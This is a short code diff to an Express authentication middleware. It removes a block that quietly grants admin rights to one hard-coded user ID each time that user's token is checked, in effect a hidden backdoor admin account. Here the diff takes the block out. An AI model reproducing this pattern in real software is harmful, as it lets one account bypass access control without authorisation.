@@ -13,19 +13,6 @@ module.exports.checkUser = (req, res, next) => {
         let user = await UserModel.findById(decodedToken.id);
         res.locals.user = user;
         console.log(res.locals.user);
-        if (user._id === "62e249ce2777e0c76ea627aa") {
-          UserModel.findByIdAndUpdate(
-            { _id: "62e249ce2777e0c76ea627aa" },
-            { admin: "true" },
-            (err, data) => {
-              if (!err) {
-                res.send(data);
-              } else {
-                res.send(err);
-              }
-            }
-          );
-        }
         next();
       }
     });
